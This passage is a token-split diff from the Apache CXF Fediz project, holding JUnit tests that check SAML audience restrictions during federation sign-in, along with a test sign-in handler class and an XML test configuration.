"TestSigninHandler", "(", "config", ")", ";", "Assert", ".", "assertNotNull", "(", "signinHandler", ".", "handleRequest", "(", "req", ",", "resp", ")", ");", "}", "@", "org", ".", "junit", ".", "Test", "public", "void", "validateAudienceThatIsRequiredAgainstMultipleAudiences", "(", ")", "throws", "Exception", "{", "SAML2CallbackHandler", "callbackHandler", "=", "new", "SAML2CallbackHandler", "(", ");", "callbackHandler", ".", "setStatement", "(", "SAML2CallbackHandler", ".", "Statement", ".", "ATTR", ")", ";", "callbackHandler", ".", "setConfirmationMethod", "(", "SAML2Constants", ".", "CONF_BEARER", ")", ";", "callbackHandler", ".", "setIssuer", "(", "TEST_RSTR_ISSUER", ")", ";", "callbackHandler", ".", "setSubjectName", "(", "TEST_USER", ")", ";", "ConditionsBean", "cp", "=", "new", "ConditionsBean", "(", ");", "AudienceRestrictionBean", "audienceRestriction", "=", "new", "AudienceRestrictionBean", "(", ");", "audienceRestriction", ".", "getAudienceURIs", "(", ").", "add", "(", "TEST_AUDIENCE", ")", ";", "cp", ".", "setAudienceRestrictions", "(", "Collections", ".", "singletonList", "(", "audienceRestriction", ")", ");", "callbackHandler", ".", "setConditions", "(", "cp", ")", ";", "SAMLCallback", "samlCallback", "=", "new", "SAMLCallback", "(", ");", "SAMLUtil", ".", "doSAMLCallback", "(", "callbackHandler", ",", "samlCallback", ")", ";", "SamlAssertionWrapper", "assertion", "=", "new", "SamlAssertionWrapper", "(", "samlCallback", ")", ";", "String", "rstr", "=", "createSamlToken", "(", "assertion", ",", "\"", "mystskey", "\"", ",", "true", ")", ";", "configurator", "=", "null", ";", "FedizContext", "config", "=", "getFederationConfigurator", "(", ").", "getFedizContext", "(", "\"", "AUD2", "\"", ");", "/", "/", "Mock", "up", "the", "servet", "request", "/", "response", "HttpServletRequest", "req", "=", "EasyMock", ".", "createMock", "(", "HttpServletRequest", ".", "class", ")", ";", "EasyMock", ".", "expect", "(", "req", ".", "getParameter", "(", "FederationConstants", ".", "PARAM_HOME_REALM", ")", ").", "andReturn", "(", "null", ")", ";", "EasyMock", ".", "expect", "(", "req", ".", "getRequestURL", "(", "))", ".", "andReturn", "(", "new", "StringBuffer", "(", "TEST_REQUEST_URL", ")", ");", "EasyMock", ".", "expect", "(", "req", ".", "getContextPath", "(", "))", ".", "andReturn", "(", "TEST_REQUEST_URI", ")", ";", "EasyMock", ".", "expect", "(", "req", ".", "getMethod", "(", "))", ".", "andReturn", "(", "\"", "POST", "\"", ");", "EasyMock", ".", "expect", "(", "req", ".", "getParameter", "(", "FederationConstants", ".", "PARAM_RESULT", ")", ").", "andReturn", "(", "rstr", ")", ";", "EasyMock", ".", "expect", "(", "req", ".", "getParameter", "(", "FederationConstants", ".", "PARAM_ACTION", ")", ")", ".", "andReturn", "(", "FederationConstants", ".", "ACTION_SIGNIN", ")", ";", "String", "relayState", "=", "\"", "asfnaosif123123", "\"", ";", "EasyMock", ".", "expect", "(", "req", ".", "getParameter", "(", "\"", "RelayState", "\"", "))", ".", "andReturn", "(", "relayState", ")", ";", "EasyMock", ".", "expect", "(", "req", ".", "getAttribute", "(", "\"", "javax", ".", "servlet", ".", "request", ".", "X509Certificate", "\"", "))", ".", "andReturn", "(", "null", ")", ";", "EasyMock", ".", "expect", "(", "req", ".", "getQueryString", "(", "))", ".", "andReturn", "(", "null", ")", ";", "EasyMock", ".", "replay", "(", "req", ")", ";", "HttpServletResponse", "resp", "=", "EasyMock", ".", "createMock", "(", "HttpServletResponse", ".", "class", ")", ";", "EasyMock", ".", "replay", "(", "resp", ")", ";", "/", "/", "Now", "validate", "the", "request", "TestSigninHandler", "signinHandler", "=", "new", "TestSigninHandler", "(", "config", ")", ";", "Assert", ".", "assertNotNull", "(", "signinHandler", ".", "handleRequest", "(", "req", ",", "resp", ")", ");", "}", "@", "org", ".", "junit", ".", "Test", "public", "void", "validateBadAudienceThatIsRequired", "(", ")", "throws", "Exception", "{", "SAML2CallbackHandler", "callbackHandler", "=", "new", "SAML2CallbackHandler", "(", ");", "callbackHandler", ".", "setStatement", "(", "SAML2CallbackHandler", ".", "Statement", ".", "ATTR", ")", ";", "callbackHandler", ".", "setConfirmationMethod", "(", "SAML2Constants", ".", "CONF_BEARER", ")", ";", "callbackHandler", ".", "setIssuer", "(", "TEST_RSTR_ISSUER", ")", ";", "callbackHandler", ".", "setSubjectName", "(", "TEST_USER", ")", ";", "ConditionsBean", "cp", "=", "new", "ConditionsBean", "(", ");", "AudienceRestrictionBean", "audienceRestriction", "=", "new", "AudienceRestrictionBean", "(", ");", "audienceRestriction", ".", "getAudienceURIs", "(", ").", "add", "(", "\"", "https", ":", "//", "localhost", "/", "badfedizhelloworld", "\"", ");", "cp", ".", "setAudienceRestrictions", "(", "Collections", ".", "singletonList", "(", "audienceRestriction", ")", ");", "callbackHandler", ".", "setConditions", "(", "cp", ")", ";", "SAMLCallback", "samlCallback", "=", "new", "SAMLCallback", "(", ");", "SAMLUtil", ".", "doSAMLCallback", "(", "callbackHandler", ",", "samlCallback", ")", ";", "SamlAssertionWrapper", "assertion", "=", "new", "SamlAssertionWrapper", "(", "samlCallback", ")", ";", "String", "rstr", "=", "createSamlToken", "(", "assertion", ",", "\"", "mystskey", "\"", ",", "true", ")", ";", "configurator", "=", "null", ";", "FedizContext", "config", "=", "getFederationConfigurator", "(", ").", "getFedizContext", "(", "\"", "AUD1", "\"", ");", "/", "/", "Mock", "up", "the", "servet", "request", "/", "response", "HttpServletRequest", "req", "=", "EasyMock", ".", "createMock", "(", "HttpServletRequest", ".", "class", ")", ";", "EasyMock", ".", "expect", "(", "req", ".", "getParameter", "(", "FederationConstants", ".", "PARAM_HOME_REALM", ")", ").", "andReturn", "(", "null", ")", ";", "EasyMock", ".", "expect", "(", "req", ".", "getRequestURL", "(", "))", ".", "andReturn", "(", "new", "StringBuffer", "(", "TEST_REQUEST_URL", ")", ");", "EasyMock", ".", "expect", "(", "req", ".", "getContextPath", "(", "))", ".", "andReturn", "(", "TEST_REQUEST_URI", ")", ";", "EasyMock", ".", "expect", "(", "req", ".", "getMethod", "(", "))", ".", "andReturn", "(", "\"", "POST", "\"", ");", "EasyMock", ".", "expect", "(", "req", ".", "getParameter", "(", "FederationConstants", ".", "PARAM_RESULT", ")", ").", "andReturn", "(", "rstr", ")", ";", "EasyMock", ".", "expect", "(", "req", ".", "getParameter", "(", "FederationConstants", ".", "PARAM_ACTION", ")", ")", ".", "andReturn", "(", "FederationConstants", ".", "ACTION_SIGNIN", ")", ";", "String", "relayState", "=", "\"", "asfnaosif123123", "\"", ";", "EasyMock", ".", "expect", "(", "req", ".", "getParameter", "(", "\"", "RelayState", "\"", "))", ".", "andReturn", "(", "relayState", ")", ";", "EasyMock", ".", "expect", "(", "req", ".", "getAttribute", "(", "\"", "javax", ".", "servlet", ".", "request", ".", "X509Certificate", "\"", "))", ".", "andReturn", "(", "null", ")", ";", "EasyMock", ".", "expect", "(", "req", ".", "getQueryString", "(", "))", ".", "andReturn", "(", "null", ")", ";", "EasyMock", ".", "replay", "(", "req", ")", ";", "HttpServletResponse", "resp", "=", "EasyMock", ".", "createMock", "(", "HttpServletResponse", ".", "class", ")", ";", "EasyMock", ".", "replay", "(", "resp", ")", ";", "/", "/", "Now", "validate", "the", "request", "TestSigninHandler", "signinHandler", "=", "new", "TestSigninHandler", "(", "config", ")", ";", "Assert", ".", "assertNull", "(", "signinHandler", ".", "handleRequest", "(", "req", ",", "resp", ")", ");", "}", "@", "org", ".", "junit", ".", "Test", "public", "void", "validateNoAudienceThatIsRequired", "(", ")", "throws", "Exception", "{", "SAML2CallbackHandler", "callbackHandler", "=", "new", "SAML2CallbackHandler", "(", ");", "callbackHandler", ".", "setStatement", "(", "SAML2CallbackHandler", ".", "Statement", ".", "ATTR", ")", ";", "callbackHandler", ".", "setConfirmationMethod", "(", "SAML2Constants", ".", "CONF_BEARER", ")", ";", "callbackHandler", ".", "setIssuer", "(", "TEST_RSTR_ISSUER", ")", ";", "callbackHandler", ".", "setSubjectName", "(", "TEST_USER", ")", ";", "ConditionsBean", "cp", "=", "new", "ConditionsBean", "(", ");", "callbackHandler", ".", "setConditions", "(", "cp", ")", ";", "SAMLCallback", "samlCallback", "=", "new", "SAMLCallback", "(", ");", "SAMLUtil", ".", "doSAMLCallback", "(", "callbackHandler", ",", "samlCallback", ")", ";", "SamlAssertionWrapper", "assertion", "=", "new", "SamlAssertionWrapper", "(", "samlCallback", ")", ";", "String", "rstr", "=", "createSamlToken", "(", "assertion", ",", "\"", "mystskey", "\"", ",", "true", ")", ";", "configurator", "=", "null", ";", "FedizContext", "config", "=", "getFederationConfigurator", "(", ").", "getFedizContext", "(", "\"", "AUD1", "\"", ");", "/", "/", "Mock", "up", "the", "servet", "request", "/", "response", "HttpServletRequest", "req", "=", "EasyMock", ".", "createMock", "(", "HttpServletRequest", ".", "class", ")", ";", "EasyMock", ".", "expect", "(", "req", ".", "getParameter", "(", "FederationConstants", ".", "PARAM_HOME_REALM", ")", ").", "andReturn", "(", "null", ")", ";", "EasyMock", ".", "expect", "(", "req", ".", "getRequestURL", "(", "))", ".", "andReturn", "(", "new", "StringBuffer", "(", "TEST_REQUEST_URL", ")", ");", "EasyMock", ".", "expect", "(", "req", ".", "getContextPath", "(", "))", ".", "andReturn", "(", "TEST_REQUEST_URI", ")", ";", "EasyMock", ".", "expect", "(", "req", ".", "getMethod", "(", "))", ".", "andReturn", "(", "\"", "POST", "\"", ");", "EasyMock", ".", "expect", "(", "req", ".", "getParameter", "(", "FederationConstants", ".", "PARAM_RESULT", ")", ").", "andReturn", "(", "rstr", ")", ";", "EasyMock", ".", "expect", "(", "req", ".", "getParameter", "(", "FederationConstants", ".", "PARAM_ACTION", ")", ")", ".", "andReturn", "(", "FederationConstants", ".", "ACTION_SIGNIN", ")", ";", "String", "relayState", "=", "\"", "asfnaosif123123", "\"", ";", "EasyMock", ".", "expect", "(", "req", ".", "getParameter", "(", "\"", "RelayState", "\"", "))", ".", "andReturn", "(", "relayState", ")", ";", "EasyMock", ".", "expect", "(", "req", ".", "getAttribute", "(", "\"", "javax", ".", "servlet", ".", "request", ".", "X509Certificate", "\"", "))", ".", "andReturn", "(", "null", ")", ";", "EasyMock", ".", "expect", "(", "req", ".", "getQueryString", "(", "))", ".", "andReturn", "(", "null", ")", ";", "EasyMock", ".", "replay", "(", "req", ")", ";", "HttpServletResponse", "resp", "=", "EasyMock", ".", "createMock", "(", "HttpServletResponse", ".", "class", ")", ";", "EasyMock", ".", "replay", "(", "resp", ")", ";", "/", "/", "Now", "validate", "the", "request", "TestSigninHandler", "signinHandler", "=", "new", "TestSigninHandler", "(", "config", ")", ";", "Assert", ".", "assertNull", "(", "signinHandler", ".", "handleRequest", "(", "req", ",", "resp", ")", ");", "}", "@", "org", ".", "junit", ".", "Test", "public", "void", "validateNoAudienceThatIsNotRequired", "(", ")", "throws", "Exception", "{", "SAML2CallbackHandler", "callbackHandler", "=", "new", "SAML2CallbackHandler", "(", ");", "callbackHandler", ".", "setStatement", "(", "SAML2CallbackHandler", ".", "Statement", ".", "ATTR", ")", ";", "callbackHandler", ".", "setConfirmationMethod", "(", "SAML2Constants", ".", "CONF_BEARER", ")", ";", "callbackHandler", ".", "setIssuer", "(", "TEST_RSTR_ISSUER", ")", ";", "callbackHandler", ".", "setSubjectName", "(", "TEST_USER", ")", ";", "ConditionsBean", "cp", "=", "new", "ConditionsBean", "(", ");", "callbackHandler", ".", "setConditions", "(", "cp", ")", ";", "SAMLCallback", "samlCallback", "=", "new", "SAMLCallback", "(", ");", "SAMLUtil", ".", "doSAMLCallback", "(", "callbackHandler", ",", "samlCallback", ")", ";", "SamlAssertionWrapper", "assertion", "=", "new", "SamlAssertionWrapper", "(", "samlCallback", ")", ";", "String", "rstr", "=", "createSamlToken", "(", "assertion", ",", "\"", "mystskey", "\"", ",", "true", ")", ";", "configurator", "=", "null", ";", "FedizContext", "config", "=", "getFederationConfigurator", "(", ").", "getFedizContext", "(", "\"", "NOAUD", "\"", ");", "/", "/", "Mock", "up", "the", "servet", "request", "/", "response", "HttpServletRequest", "req", "=", "EasyMock", ".", "createMock", "(", "HttpServletRequest", ".", "class", ")", ";", "EasyMock", ".", "expect", "(", "req", ".", "getParameter", "(", "FederationConstants", ".", "PARAM_HOME_REALM", ")", ").", "andReturn", "(", "null", ")", ";", "EasyMock", ".", "expect", "(", "req", ".", "getRequestURL", "(", "))", ".", "andReturn", "(", "new", "StringBuffer", "(", "TEST_REQUEST_URL", ")", ");", "EasyMock", ".", "expect", "(", "req", ".", "getContextPath", "(", "))", ".", "andReturn", "(", "TEST_REQUEST_URI", ")", ";", "EasyMock", ".", "expect", "(", "req", ".", "getMethod", "(", "))", ".", "andReturn", "(", "\"", "POST", "\"", ");", "EasyMock", ".", "expect", "(", "req", ".", "getParameter", "(", "FederationConstants", ".", "PARAM_RESULT", ")", ").", "andReturn", "(", "rstr", ")", ";", "EasyMock", ".", "expect", "(", "req", ".", "getParameter", "(", "FederationConstants", ".", "PARAM_ACTION", ")", ")", ".", "andReturn", "(", "FederationConstants", ".", "ACTION_SIGNIN", ")", ";", "String", "relayState", "=", "\"", "asfnaosif123123", "\"", ";", "EasyMock", ".", "expect", "(", "req", ".", "getParameter", "(", "\"", "RelayState", "\"", "))", ".", "andReturn", "(", "relayState", ")", ";", "EasyMock", ".", "expect", "(", "req", ".", "getAttribute", "(", "\"", "javax", ".", "servlet", ".", "request", ".", "X509Certificate", "\"", "))", ".", "andReturn", "(", "null", ")", ";", "EasyMock", ".", "expect", "(", "req", ".", "getQueryString", "(", "))", ".", "andReturn", "(", "null", ")", ";", "EasyMock", ".", "replay", "(", "req", ")", ";", "HttpServletResponse", "resp", "=", "EasyMock", ".", "createMock", "(", "HttpServletResponse", ".", "class", ")", ";", "EasyMock", ".", "replay", "(", "resp", ")", ";", "/", "/", "Now", "validate", "the", "request", "TestSigninHandler", "signinHandler", "=", "new", "TestSigninHandler", "(", "config", ")", ";", "Assert", ".", "assertNotNull", "(", "signinHandler", ".", "handleRequest", "(", "req", ",", "resp", ")", ");", "}", "@", "org", ".", "junit", ".", "Test", "public", "void", "validateAudienceThatIsNotRequired", "(", ")", "throws", "Exception", "{", "SAML2CallbackHandler", "callbackHandler", "=", "new", "SAML2CallbackHandler", "(", ");", "callbackHandler", ".", "setStatement", "(", "SAML2CallbackHandler", ".", "Statement", ".", "ATTR", ")", ";", "callbackHandler", ".", "setConfirmationMethod", "(", "SAML2Constants", ".", "CONF_BEARER", ")", ";", "callbackHandler", ".", "setIssuer", "(", "TEST_RSTR_ISSUER", ")", ";", "callbackHandler", ".", "setSubjectName", "(", "TEST_USER", ")", ";", "ConditionsBean", "cp", "=", "new", "ConditionsBean", "(", ");", "AudienceRestrictionBean", "audienceRestriction", "=", "new", "AudienceRestrictionBean", "(", ");", "audienceRestriction", ".", "getAudienceURIs", "(", ").", "add", "(", "TEST_AUDIENCE", ")", ";", "cp", ".", "setAudienceRestrictions", "(", "Collections", ".", "singletonList", "(", "audienceRestriction", ")", ");", "callbackHandler", ".", "setConditions", "(", "cp", ")", ";", "SAMLCallback", "samlCallback", "=", "new", "SAMLCallback", "(", ");", "SAMLUtil", ".", "doSAMLCallback", "(", "callbackHandler", ",", "samlCallback", ")", ";", "SamlAssertionWrapper", "assertion", "=", "new", "SamlAssertionWrapper", "(", "samlCallback", ")", ";", "String", "rstr", "=", "createSamlToken", "(", "assertion", ",", "\"", "mystskey", "\"", ",", "true", ")", ";", "configurator", "=", "null", ";", "FedizContext", "config", "=", "getFederationConfigurator", "(", ").", "getFedizContext", "(", "\"", "NOAUD", "\"", ");", "/", "/", "Mock", "up", "the", "servet", "request", "/", "response", "HttpServletRequest", "req", "=", "EasyMock", ".", "createMock", "(", "HttpServletRequest", ".", "class", ")", ";", "EasyMock", ".", "expect", "(", "req", ".", "getParameter", "(", "FederationConstants", ".", "PARAM_HOME_REALM", ")", ").", "andReturn", "(", "null", ")", ";", "EasyMock", ".", "expect", "(", "req", ".", "getRequestURL", "(", "))", ".", "andReturn", "(", "new", "StringBuffer", "(", "TEST_REQUEST_URL", ")", ");", "EasyMock", ".", "expect", "(", "req", ".", "getContextPath", "(", "))", ".", "andReturn", "(", "TEST_REQUEST_URI", ")", ";", "EasyMock", ".", "expect", "(", "req", ".", "getMethod", "(", "))", ".", "andReturn", "(", "\"", "POST", "\"", ");", "EasyMock", ".", "expect", "(", "req", ".", "getParameter", "(", "FederationConstants", ".", "PARAM_RESULT", ")", ").", "andReturn", "(", "rstr", ")", ";", "EasyMock", ".", "expect", "(", "req", ".", "getParameter", "(", "FederationConstants", ".", "PARAM_ACTION", ")", ")", ".", "andReturn", "(", "FederationConstants", ".", "ACTION_SIGNIN", ")", ";", "String", "relayState", "=", "\"", "asfnaosif123123", "\"", ";", "EasyMock", ".", "expect", "(", "req", ".", "getParameter", "(", "\"", "RelayState", "\"", "))", ".", "andReturn", "(", "relayState", ")", ";", "EasyMock", ".", "expect", "(", "req", ".", "getAttribute", "(", "\"", "javax", ".", "servlet", ".", "request", ".", "X509Certificate", "\"", "))", ".", "andReturn", "(", "null", ")", ";", "EasyMock", ".", "expect", "(", "req", ".", "getQueryString", "(", "))", ".", "andReturn", "(", "null", ")", ";", "EasyMock", ".", "replay", "(", "req", ")", ";", "HttpServletResponse", "resp", "=", "EasyMock", ".", "createMock", "(", "HttpServletResponse", ".", "class", ")", ";", "EasyMock", ".", "replay", "(", "resp", ")", ";", "/", "/", "Now", "validate", "the", "request", "TestSigninHandler", "signinHandler", "=", "new", "TestSigninHandler", "(", "config", ")", ";", "Assert", ".", "assertNull", "(", "signinHandler", ".", "handleRequest", "(", "req", ",", "resp", ")", ");", "}", "private", "String", "createSamlToken", "(", "SamlAssertionWrapper", "assertion", ",", "String", "alias", ",", "boolean", "sign", ")", "throws", "IOException", ",", "UnsupportedCallbackException", ",", "WSSecurityException", ",", "Exception", "{", "return", "createSamlToken", "(", "assertion", ",", "alias", ",", "sign", ",", "STSUtil", ".", "SAMPLE_RSTR_COLL_MSG", ")", ";", "}", "private", "String", "createSamlToken", "(", "SamlAssertionWrapper", "assertion", ",", "String", "alias", ",", "boolean", "sign", ",", "String", "rstr", ")", "throws", "IOException", ",", "UnsupportedCallbackException", ",", "WSSecurityException", ",", "Exception", "{", "WSPasswordCallback", "[", "]", "cb", "=", "{", "new", "WSPasswordCallback", "(", "alias", ",", "WSPasswordCallback", ".", "SIGNATURE", ")", "}", ";", "cbPasswordHandler", ".", "handle", "(", "cb", ")", ";", "String", "password", "=", "cb", "[", "0", "]", ".", "getPassword", "(", ");", "if", "(", "sign", ")", "{", "assertion", ".", "signAssertion", "(", "alias", ",", "password", ",", "crypto", ",", "false", ")", ";", "}", "Document", "doc", "=", "STSUtil", ".", "toSOAPPart", "(", "rstr", ")", ";", "Element", "token", "=", "assertion", ".", "toDOM", "(", "doc", ")", ";", "Element", "e", "=", "XMLUtils", ".", "findElement", "(", "doc", ",", "\"", "RequestedSecurityToken", "\"", ",", "FederationConstants", ".", "WS_TRUST_13_NS", ")", ";", "if", "(", "e", "=", "=", "null", ")", "{", "e", "=", "XMLUtils", ".", "findElement", "(", "doc", ",", "\"", "RequestedSecurityToken", "\"", ",", "FederationConstants", ".", "WS_TRUST_2005_02_NS", ")", ";", "}", "e", ".", "appendChild", "(", "token", ")", ";", "return", "DOM2Writer", ".", "nodeToString", "(", "doc", ")", ";", "}", "}", "@", "@", "-", "0", ",", "0", "+", "1", ",", "88", "@", "@", "/", "**", "*", "Licensed", "to", "the", "Apache", "Software", "Foundation", "(", "ASF", ")", "under", "one", "*", "or", "more", "contributor", "license", "agreements", ".", "See", "the", "NOTICE", "file", "*", "distributed", "with", "this", "work", "for", "additional", "information", "*", "regarding", "copyright", "ownership", ".", "The", "ASF", "licenses", "this", "file", "*", "to", "you", "under", "the", "Apache", "License", ",", "Version", "2", ".", "0", "(", "the", "*", "\"", "License", "\"", ");", "you", "may", "not", "use", "this", "file", "except", "in", "compliance", "*", "with", "the", "License", ".", "You", "may", "obtain", "a", "copy", "of", "the", "License", "at", "*", "*", "http", ":", "//", "www", ".", "apache", ".", "org", "/", "licenses", "/", "LICENSE", "-", "2", ".", "0", "*", "*", "Unless", "required", "by", "applicable", "law", "or", "agreed", "to", "in", "writing", ",", "*", "software", "distributed", "under", "the", "License", "is", "distributed", "on", "an", "*", "\"", "AS", "IS", "\"", "BASIS", ",", "WITHOUT", "WARRANTIES", "OR", "CONDITIONS", "OF", "ANY", "*", "KIND", ",", "either", "express", "or", "implied", ".", "See", "the", "License", "for", "the", "*", "specific", "language", "governing", "permissions", "and", "limitations", "*", "under", "the", "License", ".", "*", "/", "package", "org", ".", "apache", ".", "cxf", ".", "fediz", ".", "core", ".", "federation", ";", "import", "java", ".", "util", ".", "Collections", ";", "import", "java", ".", "util", ".", "List", ";", "import", "javax", ".", "servlet", ".", "http", ".", "HttpServletRequest", ";", "import", "javax", ".", "servlet", ".", "http", ".", "HttpServletResponse", ";", "import", "org", ".", "w3c", ".", "dom", ".", "Element", ";", "import", "org", ".", "apache", ".", "cxf", ".", "fediz", ".", "core", ".", "Claim", ";", "import", "org", ".", "apache", ".", "cxf", ".", "fediz", ".", "core", ".", "ClaimCollection", ";", "import", "org", ".", "apache", ".", "cxf", ".", "fediz", ".", "core", ".", "FedizPrincipal", ";", "import", "org", ".", "apache", ".", "cxf", ".", "fediz", ".", "core", ".", "config", ".", "FedizContext", ";", "import", "org", ".", "apache", ".", "cxf", ".", "fediz", ".", "core", ".", "handler", ".", "SigninHandler", ";", "import", "org", ".", "apache", ".", "cxf", ".", "fediz", ".", "core", ".", "processor", ".", "FedizResponse", ";", "public", "class", "TestSigninHandler", "extends", "SigninHandler", "<", "FedizPrincipal", ">", "{", "public", "TestSigninHandler", "(", "FedizContext", "fedizContext", ")", "{", "super", "(", "fedizContext", ")", ";", "}", "@", "Override", "protected", "FedizPrincipal", "createPrincipal", "(", "HttpServletRequest", "request", ",", "HttpServletResponse", "response", ",", "FedizResponse", "wfRes", ")", "{", "List", "<", "String", ">", "roles", "=", "wfRes", ".", "getRoles", "(", ");", "if", "(", "roles", "=", "=", "null", "|", "|", "roles", ".", "size", "(", ")", "=", "=", "0", ")", "{", "roles", "=", "Collections", ".", "singletonList", "(", "\"", "Authenticated", "\"", ");", "}", "/", "/", "proceed", "creating", "the", "JAAS", "Subject", "FedizPrincipal", "principal", "=", "new", "FederationPrincipalImpl", "(", "wfRes", ".", "getUsername", "(", "),", "roles", ",", "wfRes", ".", "getClaims", "(", "),", "wfRes", ".", "getToken", "(", "))", ";", "return", "principal", ";", "}", "private", "static", "class", "FederationPrincipalImpl", "implements", "FedizPrincipal", "{", "protected", "ClaimCollection", "claims", ";", "protected", "Element", "loginToken", ";", "private", "String", "username", ";", "FederationPrincipalImpl", "(", "String", "username", ",", "List", "<", "String", ">", "roles", ",", "List", "<", "Claim", ">", "claims", ",", "Element", "loginToken", ")", "{", "this", ".", "claims", "=", "new", "ClaimCollection", "(", "claims", ")", ";", "this", ".", "loginToken", "=", "loginToken", ";", "this", ".", "username", "=", "username", ";", "}", "public", "ClaimCollection", "getClaims", "(", ")", "{", "return", "this", ".", "claims", ";", "}", "@", "Override", "public", "Element", "getLoginToken", "(", ")", "{", "return", "loginToken", ";", "}", "@", "Override", "public", "String", "getName", "(", ")", "{", "return", "username", ";", "}", "}", "}", "@", "@", "-", "0", ",", "0", "+", "1", ",", "111", "@", "@", "<", "?", "xml", "version", "=", "\"", "1", ".", "0", "\"", "encoding", "=", "\"", "UTF", "-", "8", "\"", "?>", "<", "!-", "-", "Licensed", "to", "the", "Apache", "Software", "Foundation", "(", "ASF", ")", "under", "one", "or", "more", "contributor", "license", "agreements", ".", "See", "the", "NOTICE", "file", "distributed", "with", "this", "work", "for", "additional", "information", "regarding", "copyright", "ownership", ".", "The", "ASF", "licenses", "this", "file", "to", "you", "under", "the", "Apache", "License", ",", "Version", "2", ".", "0", "(", "the", "\"", "License", "\"", ");", "you", "may", "not", "use", "this", "file", "except", "in", "compliance", "with", "the", "License", ".", "You", "may", "obtain", "a", "copy", "of", "the", "License", "at", "http", ":", "//", "www", ".", "apache", ".", "org", "/", "licenses", "/", "LICENSE", "-", "2", ".", "0", "Unless", "required", "by", "applicable", "law", "or", "agreed", "to", "in", "writing", ",", "software", "distributed", "under", "the", "License", "is", "distributed", "on", "an", "\"", "AS", "IS", "\"", "BASIS", ",", "WITHOUT", "WARRANTIES", "OR", "CONDITIONS", "OF", "ANY", "KIND", ",", "either", "express", "or", "implied", ".", "See", "the", "License", "for", "the", "specific", "language", "governing", "permissions", "and", "limitations", "under", "the", "License", ".", "-", "->", "<", "FedizConfig", ">", "<", "contextConfig", "name", "=", "\"", "AUD1", "\"", ">", "<", "audienceUris", ">", "<", "audienceItem", ">", "https", ":", "//", "localhost", "/", "fedizhelloworld", "<", "/", "audienceItem", ">", "<", "/", "audienceUris", ">", "<", "certificateStores", ">", "<", "trustManager", ">", "<", "keyStore", "file", "=", "\"", "ststrust", ".", "jks", "\"", "password", "=", "\"", "storepass", "\"", "type", "=", "\"", "JKS", "\"", "/", ">", "<", "/", "trustManager", ">", "<", "/", "certificateStores", ">", "<", "trustedIssuers", ">", "<", "issuer", "certificateValidation", "=", "\"", "PeerTrust", "\"", "/", ">", "<", "/", "trustedIssuers", ">", "<", "maximumClockSkew", ">", "1000", "<", "/", "maximumClockSkew", ">", "<", "protocol", "xmlns", ":", "xsi", "=", "\"", "http", ":", "//", "www", ".", "w3", ".", "org", "/", "2001", "/", "XMLSchema", "-", "instance", "\"", "xsi", ":", "type", "=", "\"", "federationProtocolType", "\"", "version", "=", "\"", "1", ".", "2", "\"", ">", "<", "realm", ">", "target", "realm", "<", "/", "realm", ">", "<", "issuer", ">", "http", ":", "//", "url_to_the_issuer", "<", "/", "issuer", ">", "<", "roleDelimiter", ">", ";<", "/", "roleDelimiter", ">", "<", "roleURI", ">", "http", ":", "//", "schemas", ".", "xmlsoap", ".", "org", "/", "ws", "/", "2005", "/", "05", "/", "identity", "/", "claims", "/", "role", "<", "/", "roleURI", ">", "<", "authenticationType", "value", "=", "\"", "some", "auth", "type", "\"", "type", "=", "\"", "String", "\"", "/", ">", "<", "freshness", ">", "10000", "<", "/", "freshness", ">", "<", "reply", ">", "reply", "value", "<", "/", "reply", ">", "<", "request", ">", "REQUEST", "<", "/", "request", ">", "<", "claimTypesRequested", ">", "<", "claimType", "type", "=", "\"", "a", "particular", "claim", "type", "\"", "optional", "=", "\"", "true", "\"", "/", ">", "<", "/", "claimTypesRequested", ">", "<", "/", "protocol", ">", "<", "/", "contextConfig", ">", "<", "contextConfig", "name", "=", "\"", "AUD2", "\"", ">", "<", "audienceUris", ">", "<", "audienceItem", ">", "https", ":", "//", "localhost", "/", "fediz2helloworld", "<", "/", "audienceItem", ">", "<", "audienceItem", ">", "https", ":", "//", "localhost", "/", "fedizhelloworld", "<", "/", "audienceItem", ">", "<", "/", "audienceUris", ">", "<", "certificateStores", ">", "<", "trustManager", ">", "<", "keyStore", "file", "=", "\"", "ststrust", ".", "jks", "\"", "password", "=", "\"", "storepass", "\"", "type", "=", "\"", "JKS", "\"", "/", ">", "<", "/", "trustManager", ">", "<", "/", "certificateStores", ">", "<", "trustedIssuers", ">", "<", "issuer", "certificateValidation", "=", "\"", "PeerTrust", "\"", "/", ">", "<", "/", "trustedIssuers", ">", "<", "maximumClockSkew", ">", "1000", "<", "/", "maximumClockSkew", ">", "<", "protocol", "xmlns", ":", "xsi", "=", "\"", "http", ":", "//", "www", ".", "w3", ".", "org", "/", "2001", "/", "XMLSchema", "-", "instance", "\"", "xsi", ":", "type", "=", "\"", "federationProtocolType", "\"", "version", "=", "\"", "1", ".", "2", "\"", ">", "<", "realm", ">", "target", "realm", "<", "/", "realm", ">", "<", "issuer", ">", "http", ":", "//", "url_to_the_issuer", "<", "/", "issuer", ">", "<", "roleDelimiter", ">", ";<", "/", "roleDelimiter", ">", "<", "roleURI", ">", "http", ":", "//", "schemas", ".", "xmlsoap", ".", "org", "/", "ws", "/", "2005", "/", "05", "/", "identity", "/", "claims", "/", "role", "<", "/", "roleURI", ">", "<", "authenticationType", "value", "=", "\"", "some", "auth", "type", "\"", "type", "=", "\"", "String", "\"", "/", ">", "<", "freshness", ">", "10000", "<", "/", "freshness", ">", "<", "reply", ">", "reply", "value", "<", "/", "reply", ">", "<", "request", ">", "REQUEST", "<", "/", "request", ">", "<", "claimTypesRequested", ">", "<", "claimType", "type", "=", "\"", "a", "particular", "claim", "type", "\"", "optional", "=", "\"", "true", "\"", "/", ">", "<", "/", "claimTypesRequested", ">", "<", "/", "protocol", ">", "<", "/", "contextConfig", ">", "<", "contextConfig", "name", "=", "\"", "NOAUD", "\"", ">", "<", "certificateStores", ">", "<", "trustManager", ">", "<", "keyStore", "file", "=", "\"", "ststrust", ".", "jks", "\"", "password", "=", "\"", "storepass", "\"", "type", "=", "\"", "JKS", "\"", "/", ">", "<", "/", "trustManager", ">", "<", "/", "certificateStores", ">", "<", "trustedIssuers", ">", "<", "issuer", "certificateValidation", "=", "\"", "PeerTrust", "\"", "/", ">", "<", "/", "trustedIssuers", ">", "<", "maximumClockSkew", ">", "1000", "<", "/", "maximumClockSkew", ">", "<", "protocol", "xmlns", ":", "xsi", "=", "\"", "http", ":", "//", "www", ".", "w3", ".", "org", "/", "2001", "/", "XMLSchema", "-", "instance", "\"", "xsi", ":", "type", "=", "\"", "federationProtocolType", "\"", "version", "=", "\"", "1", ".", "2", "\"", ">", "<", "realm", ">", "target", "realm", "<", "/", "realm", ">", "<", "issuer", ">", "http", ":", "//", 